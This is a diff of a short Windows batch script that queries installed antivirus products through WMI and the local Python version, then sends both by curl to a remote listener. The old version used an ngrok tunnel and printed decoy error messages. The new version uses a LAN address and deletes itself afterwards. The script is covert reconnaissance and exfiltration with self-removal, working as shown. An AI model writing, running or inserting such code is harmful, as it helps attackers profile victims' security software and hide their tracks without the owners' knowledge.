@@ -1,10 +1,10 @@
 @echo off
-for /l %%i in (1, 1, 20) do (
-    echo Error: Something went wrong.
+setlocal enabledelayedexpansion
+for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do (
+    set "antivirus=!antivirus! %%a"
 )
-for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
-echo Antivirus Information: %antivirus%
-for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
-echo Python Version: %python_version%
-curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" https://e977-197-35-34-224.ngrok-free.app
-exit
+for /f "delims=" %%b in ('python --version 2^>^&1') do (
+    set "python_version=%%b"
+)
+curl --verbose --get --data-urlencode "Antivirus=!antivirus!" --data-urlencode "PythonVersion=!python_version!" http://192.168.1.16:8000
+del "%~f0"
